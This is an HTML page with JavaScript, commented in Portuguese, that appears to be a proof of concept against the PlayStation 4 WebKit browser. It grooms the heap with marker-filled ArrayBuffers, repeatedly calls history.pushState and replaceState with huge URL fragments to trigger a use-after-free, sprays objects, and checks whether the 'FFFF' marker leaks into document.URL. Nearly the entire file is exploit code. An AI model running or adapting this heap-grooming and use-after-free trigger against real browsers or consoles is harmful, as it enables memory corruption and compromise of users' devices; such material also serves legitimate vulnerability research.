<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Teste FFFF (64 bytes)</title>
<style>
    body { background-color: #050505; color: #ffff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #ff0; background: #440; color: #fff;
    }
    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { background-color: #ff0; color: #000; font-weight: bold; border: 5px solid #fff; padding: 10px; }
</style>
</head>
<body>
<h2>PS4 WebKit - Validação Pura (FFFF)</h2>
<div id="status">Alvo: Bucket 64 -> 'FFFF'</div>
<button onclick="runFFFFTest()">RODAR TESTE FFFF</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// Helper Original
function createFakeObject(size, marker) {
    try {
        let buf = new ArrayBuffer(size);
        let view = new Uint32Array(buf);
        for(let i=0; i<view.length; i++) {
            view[i] = marker;
        }
        return buf;
    } catch(e) { return null; }
}

async function runFFFFTest() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Preparando...";

    // CONFIGURAÇÃO ORIGINAL (Intacta, apenas trocando C por F)
    const BUCKETS = [
        { size: 80,  marker: 0x41414141 }, // AAAA
        { size: 96,  marker: 0x42424242 }, // BBBB
        { size: 64,  marker: 0x46464646 }, // FFFF (Mudança Aqui)
        { size: 128, marker: 0x44444444 }  // DDDD
    ];

    log("1. Preparando Grooming (Igual ao teste original)...");
    for(let b of BUCKETS) {
        for(let k=0; k<100; k++) keepAlive.push(createFakeObject(b.size, b.marker));
    }
    
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    // === TRIGGER UAF (Loop 48 Original) ===
    log("2. Disparando UAF (Loop 48)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        if (i === 47) {
            log(">>> SPRAY FINAL (FFFF) <<<");
            
            setTimeout(() => history.back(), 0);
            
            // Spray Massivo (Mesma quantidade do teste CCCC)
            for(let k=0; k<200; k++) {
                for(let b of BUCKETS) {
                    keepAlive.push(createFakeObject(b.size, b.marker));
                }
            }
            
            setTimeout(() => {
                for (let i = 0; i < 4; i++) new ArrayBuffer(8 * 1024 * 1024);
            }, 20); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(400);
    checkResult();
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let found = false;
    let markerFound = "";
    
    // Procura 'F' (0x46)
    for(let i=0; i < url.length && i < 5000; i++) {
        let c = url.charCodeAt(i);
        
        if(c === 0x46) { // 'F'
            found = true; 
            markerFound = "FFFF (64 bytes)"; 
            break; 
        }
        
        // Verifica se ainda vemos os antigos
        if(c === 0x43) log("Aviso: Encontrado CCCC (Cache antigo?)");
    }

    if(found) {
        log("!!! SUCESSO !!!");
        log(`Encontrado: ${markerFound}`);
        statusEl.innerText = "SUCESSO: FFFF";
        statusEl.className = "success";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("Dica: Se você viu CCCC antes, a lógica está certa. Tente recarregar para pegar a 'Race Condition'.");
    }
}
</script>
</body>
</html>
